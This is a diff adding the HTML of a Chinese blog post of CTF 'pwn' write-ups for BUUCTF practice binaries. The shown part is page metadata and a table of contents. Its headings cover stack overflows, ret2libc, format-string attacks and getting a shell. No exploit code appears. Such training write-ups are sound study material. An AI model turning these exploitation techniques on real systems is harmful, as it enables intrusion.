@@ -1,0 +1,609 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Dash"><meta name="copyright" content="Dash"><meta name="generator" content="Hexo 5.4.0"><meta name="theme" content="hexo-theme-yun"><title>PWN-WP | Dash的C0mm3nt</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.25/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_dxory92pb0h.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".post-content img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
+    const Yun = window.Yun || {};
+    window.CONFIG = {"hostname":"dashi777.github.io","root":"/","title":["Dash 的","C0mm3nt","and","叨逼叨"],"version":"1.7.0","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"data/sentences.json"}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><meta name="description" content="BUUCTF -rip题目 思路运行程序 出现segment fault –代表程序有栈溢出漏洞。 IDA静态分析栈溢出位置 变量s本来申请的长度为15，但是puts函数可以获取的字符串长度没有限制，因此，这就是栈溢出的位置。 注：变量s的长度最准确应该通过gdb调试得出;  程序这里申请一个oxf（15）长度的空间，对应rbp-15，就是s的长度。 后台函数 查看字符串可以看到&#x2F;bin&#x2F;sh，双">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN-WP">
+<meta property="og:url" content="https://dashi777.github.io/2022/06/02/PWN-WP/index.html">
+<meta property="og:site_name" content="Dash的C0mm3nt">
+<meta property="og:description" content="BUUCTF -rip题目 思路运行程序 出现segment fault –代表程序有栈溢出漏洞。 IDA静态分析栈溢出位置 变量s本来申请的长度为15，但是puts函数可以获取的字符串长度没有限制，因此，这就是栈溢出的位置。 注：变量s的长度最准确应该通过gdb调试得出;  程序这里申请一个oxf（15）长度的空间，对应rbp-15，就是s的长度。 后台函数 查看字符串可以看到&#x2F;bin&#x2F;sh，双">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220512112756611-4139333.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220512113151315-4139333.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220512232252104-4139333.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220512232550382-4139333.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220512232723747-4139333.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220512234347603-4139333.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220513233331727-4139333.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220513233628040-4139333.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220513233837600-4139333.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220513233959753-4139333.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220513234302569-4139333.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220513234407000-4139333.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220513234515612-4139333.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220513234744835-4139333.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220513234835130-4139333.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220513235133456-4139333.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220513235245035-4139333.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220513235525078-4139333.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220516213929787-4139333.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220516214028499-4139333.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTYwNTk1,size_16,color_FFFFFF,t_70%23pic_center.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTYwNTk1,size_16,color_FFFFFF,t_70#pic_center-16527115994592.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220516223543065-4139334.png">
+<meta property="og:image" content="https://dashi777.github.io/2022/06/02/PWN-WP/PWN-WP.assets/image-20220516223543065-4139334.png">
+<meta property="og:image" content="https://dashi777.github.io/2022/06/02/PWN-WP/PWN-WP.assets/image-20220516224143241-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220516224224052-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220516224603593-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220516224753863-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220516230119930-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTQyNzY3Ng==,size_16,color_FFFFFF,t_70-20220602110854222.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220516230253940-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220516235101669-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220516235754991-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220517224750234-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220517224911283-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220517231350472-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220517231741929-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220517231806588-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220517232119368-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220517233308789-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220517233334942-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220517234608771-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220518170232227-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220519000336442-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220519102846904-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220519103643322-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220519103921976-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220519104303256-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220519104724585-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220519110916003-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220519120737055-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220519123439492-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220519123533189-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220519123734248-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220519124046196-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220521222818130-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220519234920259-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220519235000588-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220520000532522-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220602104537477-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220602104744252-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220602105739437-4139334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220602110129760-4139334.png">
+<meta property="article:published_time" content="2022-06-02T03:04:08.000Z">
+<meta property="article:modified_time" content="2022-06-06T09:12:50.560Z">
+<meta property="article:author" content="Dash">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="逆向">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220512112756611-4139333.png"><script src="/js/ui/mode.js"></script></head><body><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Dash"><img width="96" loading="lazy" src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/67204822_1232942243533749_1151443351383890340_n.jpeg" alt="Dash"></a><div class="site-author-name"><a href="/about/">Dash</a></div><span class="site-name">Dash的C0mm3nt</span><sub class="site-subtitle">左拥右抱</sub><div class="site-desciption"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">11</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">2</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">13</span></a></div><a class="site-state-item hty-icon-button" href="https://dashi777.github.io/" title="github"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-open-arm-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:dashi777@foxmail.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/dashi777" title="GitHub" target="_blank" style="color:#181717"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#BUUCTF-rip"><span class="toc-number">1.</span> <span class="toc-text">BUUCTF -rip</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.</span> <span class="toc-text">思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.2.1.</span> <span class="toc-text">运行程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDA%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-number">1.2.2.</span> <span class="toc-text">IDA静态分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">栈溢出位置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">后台函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0payload"><span class="toc-number">1.2.3.</span> <span class="toc-text">构造payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BUUCTF-warmup-csaw-2016"><span class="toc-number">2.</span> <span class="toc-text">BUUCTF-warmup_csaw_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-1"><span class="toc-number">2.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="toc-number">2.2.</span> <span class="toc-text">思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">运行程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDA%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90-1"><span class="toc-number">2.2.2.</span> <span class="toc-text">IDA静态分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A1%E7%AE%97%E6%A0%88%E5%BA%95%E8%B7%9D%E7%A6%BB"><span class="toc-number">2.2.3.</span> <span class="toc-text">计算栈底距离</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E5%87%BD%E6%95%B0-1"><span class="toc-number">2.2.4.</span> <span class="toc-text">后台函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0payload-1"><span class="toc-number">2.3.</span> <span class="toc-text">构造payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BUUCTF-ciscn-2019-n-1"><span class="toc-number">3.</span> <span class="toc-text">BUUCTF-ciscn_2019_n_1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-2"><span class="toc-number">3.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-2"><span class="toc-number">3.2.</span> <span class="toc-text">思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F-2"><span class="toc-number">3.2.1.</span> <span class="toc-text">运行程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDA%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90-2"><span class="toc-number">3.2.2.</span> <span class="toc-text">IDA静态分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E9%97%B4%E8%AE%A1%E7%AE%97"><span class="toc-number">3.2.3.</span> <span class="toc-text">空间计算</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0payload-2"><span class="toc-number">3.3.</span> <span class="toc-text">构造payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BUUCTF-pwn1-sctf-2016"><span class="toc-number">4.</span> <span class="toc-text">BUUCTF-pwn1_sctf_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-3"><span class="toc-number">4.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F-3"><span class="toc-number">4.2.</span> <span class="toc-text">运行程序</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IDA%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90-3"><span class="toc-number">4.2.1.</span> <span class="toc-text">IDA静态分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E9%97%A8%E5%87%BD%E6%95%B0"><span class="toc-number">4.2.2.</span> <span class="toc-text">后门函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-number">4.3.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BUUCTF-ciscn-2019-c-1"><span class="toc-number">5.</span> <span class="toc-text">BUUCTF-ciscn_2019_c_1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-4"><span class="toc-number">5.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-3"><span class="toc-number">5.2.</span> <span class="toc-text">思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F-4"><span class="toc-number">5.2.1.</span> <span class="toc-text">运行程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDA%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90-4"><span class="toc-number">5.2.2.</span> <span class="toc-text">IDA静态分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc%E2%80%93%E9%80%9A%E7%94%A8%E6%AD%A5%E9%AA%A4"><span class="toc-number">5.3.</span> <span class="toc-text">ret2libc–通用步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Bgot%E5%92%8Cplt%E8%A1%A8"><span class="toc-number">5.3.1.</span> <span class="toc-text">查看got和plt表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ROPGadget%E6%9F%A5%E7%9C%8Bgadget"><span class="toc-number">5.3.2.</span> <span class="toc-text">ROPGadget查看gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8libcsearcher%E8%AE%A1%E7%AE%97%E4%BD%8D%E7%BD%AE%E5%81%8F%E7%A7%BB%E5%92%8Clibc"><span class="toc-number">5.3.3.</span> <span class="toc-text">利用libcsearcher计算位置偏移和libc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8libc-so%E8%B0%83%E7%94%A8%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0getshell"><span class="toc-number">5.3.4.</span> <span class="toc-text">利用libc.so调用系统函数getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload-1"><span class="toc-number">5.4.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BUUCTF-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9B-PWN5"><span class="toc-number">6.</span> <span class="toc-text">BUUCTF-[第五空间2019 决赛]PWN5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-5"><span class="toc-number">6.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E2%80%93%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">6.2.</span> <span class="toc-text">思路–格式化字符串</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F-5"><span class="toc-number">6.2.1.</span> <span class="toc-text">运行程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDA%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90-5"><span class="toc-number">6.2.2.</span> <span class="toc-text">IDA静态分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E7%94%A8%E6%AD%A5%E9%AA%A4"><span class="toc-number">6.3.</span> <span class="toc-text">通用步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%BD%8D%E7%A7%BB"><span class="toc-number">6.3.1.</span> <span class="toc-text">查看位移</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0payload-3"><span class="toc-number">6.3.2.</span> <span class="toc-text">构造payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BUUCTF-ciscn-2019-n-8"><span class="toc-number">7.</span> <span class="toc-text">BUUCTF-ciscn_2019_n_8</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-6"><span class="toc-number">7.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F-6"><span class="toc-number">7.2.</span> <span class="toc-text">运行程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IDA%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90-6"><span class="toc-number">7.3.</span> <span class="toc-text">IDA静态分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-4"><span class="toc-number">7.4.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload-2"><span class="toc-number">7.5.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BUUCTF-jarvisoj-level2"><span class="toc-number">8.</span> <span class="toc-text">BUUCTF-jarvisoj_level2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-7"><span class="toc-number">8.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F-7"><span class="toc-number">8.2.</span> <span class="toc-text">运行程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IDA%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90-7"><span class="toc-number">8.3.</span> <span class="toc-text">IDA静态分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload-3"><span class="toc-number">8.4.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BUUCTF-jarvisoj-level2-x64"><span class="toc-number">9.</span> <span class="toc-text">BUUCTF-jarvisoj_level2_x64</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-8"><span class="toc-number">9.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IDA%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90-8"><span class="toc-number">9.2.</span> <span class="toc-text">IDA静态分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-5"><span class="toc-number">9.3.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload-4"><span class="toc-number">9.4.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BUUCTF-babyrop"><span class="toc-number">10.</span> <span class="toc-text">BUUCTF-babyrop</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-9"><span class="toc-number">10.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F-8"><span class="toc-number">10.2.</span> <span class="toc-text">运行程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IDA%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90-9"><span class="toc-number">10.3.</span> <span class="toc-text">IDA静态分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc%E2%80%93%E5%A5%97%E8%B7%AF"><span class="toc-number">10.4.</span> <span class="toc-text">ret2libc–套路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Bgot%E8%A1%A8"><span class="toc-number">10.4.1.</span> <span class="toc-text">查看got表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8libsearch%E8%AE%A1%E7%AE%97%E5%81%8F%E7%A7%BB%E9%87%8F"><span class="toc-number">10.4.2.</span> <span class="toc-text">利用libsearch计算偏移量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%81%8F%E7%A7%BB%E9%87%8F%E8%8E%B7%E5%8F%96%E5%90%8E%E9%97%A8"><span class="toc-number">10.4.3.</span> <span class="toc-text">利用偏移量获取后门</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload-5"><span class="toc-number">10.5.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9F%90%E5%88%9D%E8%B5%9B%E2%80%93login"><span class="toc-number">11.</span> <span class="toc-text">某初赛–login</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" 